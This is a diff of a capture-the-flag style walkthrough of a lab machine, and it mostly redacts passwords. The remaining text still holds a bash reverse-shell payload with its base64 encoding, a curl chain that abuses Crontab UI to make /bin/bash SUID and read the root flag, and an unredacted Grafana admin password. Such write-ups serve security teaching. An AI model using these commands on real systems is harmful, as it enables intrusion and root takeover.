@@ -150,7 +150,7 @@ We have RCE as root inside the Grafana Docker container.
 The payload required base64 encoding to avoid quote conflicts with the DuckDB query:
 
 ```bash
-echo 'bash -i >& /dev/tcp/***REMOVED***/4444 0>&1' | base64
+echo 'bash -i >& /dev/tcp/<YOUR_TUN0_IP>/4444 0>&1' | base64
 # YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS80NDQ0IDA+JjEK
 ```
 
@@ -176,7 +176,7 @@ env
 
 ```
 GF_SECURITY_ADMIN_USER=enzo
-GF_SECURITY_ADMIN_PASSWORD=***REMOVED***
+GF_SECURITY_ADMIN_PASSWORD=[REDACTED]
 ```
 
 Grafana admin credentials stored as environment variables — a common misconfiguration in Docker deployments.
@@ -185,7 +185,7 @@ Grafana admin credentials stored as environment variables — a common misconfig
 
 ```bash
 ssh enzo@10.129.43.11
-# Password: ***REMOVED***
+# Password: [REDACTED]
 ```
 
 ```bash
@@ -223,19 +223,19 @@ cat /opt/crontabs/crontab.db
 ```
 
 ```json
-{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana ... zip -P ***REMOVED*** ..."}
+{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana ... zip -P [REDACTED] ..."}
 {"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *"}
 ```
 
 Two findings:
-1. **Password** `***REMOVED***` embedded in the backup command
+1. **Password** `[REDACTED]` embedded in the backup command
 2. A **Cleanup job** running `/root/scripts/cleanup.sh` every minute as root
 
 LinPEAS confirmed the Crontab UI service credentials:
 
 ```
 Service: crontab-ui.service (User: root)
-Basic-Auth credentials: user='root' pwd='***REMOVED***'
+Basic-Auth credentials: user='root' pwd='[REDACTED]'
 ```
 
 ---
@@ -258,10 +258,10 @@ Port 8000 was running **Crontab UI** — a web-based cron job manager running as
 until ss -tlnp | grep -q 8000; do
   echo "waiting..."; sleep 1
 done && echo "UP!" \
-&& curl -s -u root:***REMOVED*** -X POST "http://127.0.0.1:8000/save" \
+&& curl -s -u root:[REDACTED] -X POST "http://127.0.0.1:8000/save" \
   -d "_id=gNIRXh1WIc9K7BYX&name=Cleanup&command=chmod+u%2Bs+/bin/bash&schedule=*+*+*+*+*&logging=false" \
 && sleep 0.2 \
-&& curl -s -u root:***REMOVED*** -X POST "http://127.0.0.1:8000/runjob" \
+&& curl -s -u root:[REDACTED] -X POST "http://127.0.0.1:8000/runjob" \
   -d "_id=gNIRXh1WIc9K7BYX" \
 && sleep 0.5 \
 && /bin/bash -p -c 'cat /root/root.txt'
@@ -280,8 +280,8 @@ done && echo "UP!" \
 | Username | Password | Service |
 |---|---|---|
 | `admin` | `0D5oT70Fq13EvB5r` | Grafana |
-| `enzo` | `***REMOVED***` | SSH |
-| `root` | `***REMOVED***` | Crontab UI |
+| `enzo` | `[REDACTED]` | SSH |
+| `root` | `[REDACTED]` | Crontab UI |
 
 ---
 
